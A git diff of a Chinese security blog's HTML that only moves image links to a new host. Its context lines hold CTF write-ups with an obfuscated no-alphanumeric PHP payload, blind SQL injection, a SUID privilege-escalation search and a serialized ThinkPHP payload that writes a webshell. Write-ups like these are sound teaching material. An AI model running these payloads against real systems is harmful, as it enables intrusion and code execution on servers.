-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820151817.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820151817.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。&lt;/p>
@@ -14991,7 +14991,7 @@ loading="lazy"
 &lt;/div>&lt;h1 id="write-up">Write Up
 &lt;/h1>&lt;h2 id="explation">Explation
 &lt;/h2>&lt;p>题目代码比较简单，首先看看第一个正则：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190711014316.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190711014316.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>再看看第二个过滤，&lt;code>strtolower&lt;/code>将字符串转换为小写，用&lt;code>count_chars&lt;/code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13&lt;/p>
@@ -15179,7 +15179,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">.&lt;/span>&lt;span class="nx">chr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))();&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713013742.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190713013742.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这里要需要用到&lt;code>.&lt;/code>进行字符串拼接，然而&lt;code>.&lt;/code>又被 ban 掉了，所以我们得另寻他路&lt;/p>
@@ -15286,7 +15286,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>&lt;span class="c1">//phpinfo
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713122647.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190713122647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>结果回显&lt;code>you are so close, omg&lt;/code>&lt;/p>
@@ -15322,7 +15322,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nx">AYAYYRY&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">(((((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))))))();&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714001039.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714001039.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能需要注意的就是将&lt;code>+&lt;/code>进行 urlencode ，因为&lt;code>+&lt;/code>在 url 中是空格。&lt;/p>
@@ -15358,7 +15358,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nx">qiqhnin&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">iiiiibi&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">hhhhimh&lt;/span>&lt;span class="p">)();&lt;/span>&lt;span class="c1">//phpinfo()
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714004923.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714004923.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="another-way-step-2">Another Way-Step 2
@@ -15412,7 +15412,7 @@ loading="lazy"
 &lt;p>&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener"
 >无字母数字webshell之提高篇&lt;/a>&lt;/p>
 &lt;p>这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714230842.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190714230842.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7 环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。&lt;/p>
@@ -15433,22 +15433,22 @@ loading="lazy"
 &lt;/h2>&lt;p>地址在&lt;a class="link" href="http://39.106.184.130:8084/" target="_blank" rel="noopener"
 >http://39.106.184.130:8084/&lt;/a>&lt;/p>
 &lt;p>扫目录得到&lt;code>.DS_Store&lt;/code>文件，使用 lijiejie 的 dstore_exp 工具恢复文件，又得到一个&lt;code>CTF_Can_U_Tell_Me_The_Flag&lt;/code>的文件夹，发现有&lt;code>.git&lt;/code> ，直接用 GitHack 弄下来，在&lt;code>git log&lt;/code>中发现 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190705124910.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190705124910.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web2">Web2
 &lt;/h2>&lt;p>Web2地址给了两个，两个地址都不一样…蒙蔽&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190705160448.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190705160448.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>第二个地址给了个 GitLab 的地址，我以为官方弄错了啥的，一直怼第一个地址，各种猜，SSRF、注入啥的都猜了结果都没用。&lt;/p>
 &lt;p>结果在赛后有师傅说 Gitlab 有越权&amp;hellip;然后自己扫了一下当真扫到了&lt;code>/root&lt;/code>的地址，可以越权访问 Administrator 的页面&lt;/p>
 &lt;p>或者说可以看到 Administrator 的提交记录&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190705160903.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190705160903.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到下面有个 commit 描述：增加读取 flag 代码…然后得到源码&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190705161423.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190705161423.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>后面就没什么好说的了&amp;hellip;源码如下：&lt;/p>
@@ -15562,7 +15562,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;/html&amp;gt;
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190705161503.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190705161503.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web3">Web3
@@ -15570,17 +15570,17 @@ loading="lazy"
 >exp&lt;/a> 可以拿到 shell&lt;/p>
 &lt;p>但是可以发现 flag.txt 只有 600 的权限，查看内核，尝试用&lt;a class="link" href="https://github.com/backlion/CVE-2018-17182" target="_blank" rel="noopener"
 >CVE-2018-18182&lt;/a>进行提权，后来貌似被主办方修了，没提成功。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707002520.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707002520.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试使用 SUID 进行提权，可以参考&lt;a class="link" href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener"
 >【安全科普】Linux提权——利用可执行文件SUID&lt;/a>&lt;/p>
 &lt;p>使用&lt;code>find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/code>查看可以拥有 SUID 权限的执行文件：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707002656.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707002656.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现有&lt;code>tac&lt;/code>命令，然后直接用&lt;code>tac&lt;/code>就可以拿到 flag 了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707002850.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707002850.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里比赛的时候直接用&lt;code>tac&lt;/code>可以拿到了，现在又不可以了&amp;hellip;不知道是不是这个 exp 的原因…没有深入&amp;hellip;&lt;/p>
@@ -15589,13 +15589,13 @@ loading="lazy"
 &lt;/h2>&lt;p>没搞出来…给了个 password.txt ，也是给了两个 web 地址，比较迷。&lt;/p>
 &lt;p>然而用这个文本里面的登录第一个 web admin 账户，没有成功&amp;hellip;&lt;/p>
 &lt;p>看第二个 web 地址回显了一个 mysql 的错误。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707003258.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707003258.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>不确定是不是被搅屎了…两个 web 地址的脑洞真搞不动&amp;hellip;&lt;/p>
 &lt;p>（盲猜第一个进入管理员后用 Rogue mysql 来拿 flag&lt;/p>
 &lt;h2 id="web5">Web5
-&lt;/h2>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707003455.png"
+&lt;/h2>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707003455.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>中间有个按钮用来随机 id ，一看就是个注入题。ban了比较多的关键字，大小写也绕不过，而且还 ban 了&lt;code>information_schema&lt;/code>关键字。那就说明不能用一般的注入方法来弄。&lt;/p>
@@ -15608,7 +15608,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="k">case&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">when&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">33&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">then&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">end&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190707003804.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190707003804.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到数据库名为 deb7cb73f0ea2b2af2d1e3715fd12044 。接下来怎么弄表名呢？尝试了好一会，绕不过限制，然后题目又提示 flag 长度为32&amp;hellip;&lt;/p>
@@ -15731,11 +15731,11 @@ loading="lazy"
 &lt;/div>&lt;p>这里又调用了&lt;code>$this-&amp;gt;except[$name]&lt;/code>，而&lt;code>$name&lt;/code>我们可以通过&lt;code>__call&lt;/code>调用的值确定为&lt;code>index&lt;/code>，而且&lt;code>Profile&lt;/code>类存在一个公有类&lt;code>except&lt;/code>可以供我们修改。&lt;/p>
 &lt;p>接着利用&lt;code>_get&lt;/code>的返回会使&lt;code>__call&lt;/code>方法中的&lt;code>if&lt;/code>为真，执行&lt;code>$this-&amp;gt;{$this-&amp;gt;{$name}}($arguments);&lt;/code>&lt;/p>
 &lt;p>这里我大概简化了一下代码：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190603234837.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190603234837.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>结果如下，这样这个构造链就比较清楚了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190603235150.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190603235150.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>既然有了构造链，那我们可以怎么做呢？在&lt;code>Profile&lt;/code>类中我们还可以发现上传功能的方法有这样的代码：&lt;/p>
@@ -15886,7 +15886,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">YToxOntzOjI6IklEIjtPOjI3OiJhcHBcd2ViXGNvbnRyb2xsZXJcUmVnaXN0ZXIiOjg6e3M6NzoiY2hlY2tlciI7TzoyNjoiYXBwXHdlYlxjb250cm9sbGVyXFByb2ZpbGUiOjEzOntzOjc6ImNoZWNrZXIiO2I6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6NzY6InVwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9mNzg0OTJmMDUxM2M2NTllNjlkYWIyZTQ3ZjU2NzIwMi5wbmciO3M6ODoiZmlsZW5hbWUiO3M6MTM6InVwbG9hZC9zaC5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fXM6NzoiACoAdmlldyI7TjtzOjEwOiIAKgByZXF1ZXN0IjtOO3M6MTY6IgAqAGZhaWxFeGNlcHRpb24iO2I6MDtzOjE2OiIAKgBiYXRjaFZhbGlkYXRlIjtiOjA7czoxOToiACoAYmVmb3JlQWN0aW9uTGlzdCI7YTowOnt9czoxMzoiACoAbWlkZGxld2FyZSI7YTowOnt9fXM6ODoicmVnaXN0ZWQiO047czo3OiIAKgB2aWV3IjtOO3M6MTA6IgAqAHJlcXVlc3QiO047czoxNjoiACoAZmFpbEV4Y2VwdGlvbiI7YjowO3M6MTY6IgAqAGJhdGNoVmFsaWRhdGUiO2I6MDtzOjE5OiIAKgBiZWZvcmVBY3Rpb25MaXN0IjthOjA6e31zOjEzOiIAKgBtaWRkbGV3YXJlIjthOjA6e319fQ%3D%3D
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190527205452.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190527205452.png"
 loading="lazy"
 >&lt;/p>
